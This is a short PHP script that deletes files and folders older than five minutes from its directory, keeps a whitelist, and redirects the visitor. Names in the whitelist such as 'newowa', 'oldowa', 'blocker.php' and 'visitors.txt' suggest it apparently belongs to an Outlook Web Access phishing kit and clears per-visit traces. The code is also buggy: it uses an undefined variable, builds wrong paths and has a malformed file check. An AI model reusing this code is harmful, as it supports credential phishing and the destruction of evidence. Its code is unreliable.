<?php
include 'config.php';
$files = glob(getcwd().'/*'); // get all file names
	foreach($files as $file){ // iterate files
	  	if(is_dir($file)) {
			if($file==getcwd().'/domain'  || $file==getcwd().'/engine'  || $file==getcwd().'/office'  || $file==getcwd().'/funcs' || $file==getcwd().'/newowa' || $file==getcwd().'/oldowa') {
				// do nothing
			}
			else {
//check time
if (filemtime($file) < time() - 300) {
rrmdir($file);}
			}
		}
		
		else if(is_file($file)) {
			if($file==getcwd().'.htaccess' || $file==getcwd().'/blocker.php' || 
			$file==getcwd().'/delete.php' || $file==getcwd().'/error_log' || $file==getcwd().'/config.php' || 
			$file==getcwd().'/geoplugin.class.php' || $file==getcwd().'/verify.php' || $file==getcwd().'/visitors.txt' ||
			$file==getcwd().'/recopy.php' || 
			$file==getcwd().'/robots.txt' || 
			$file==getcwd().'/Settings.php' || 
			$file==getcwd().'/request.php') {
				// do nothing
			}
			else {
//check time
if (filemtime($file) < time() - 300) {
	    			unlink(getcwd().'/'.$file);
header("Location: $redirect");}
			}
		}
	}
	function rrmdir($dir) { 
		if (is_dir($dir)) { 
			$objects = scandir($dir); 
			foreach ($objects as $object) { 
				if ($object != "." && $object != "..") { 
					if (is_dir($dir."/".$object))
						rrmdir($dir."/".$object);
					else
						unlink($dir."/".$object); 
				} 
			}
			//check time
if (filemtime($file) < time() - 300) {
rmdir($dir); }
		} 
	}
header("Location: $redirect");
?>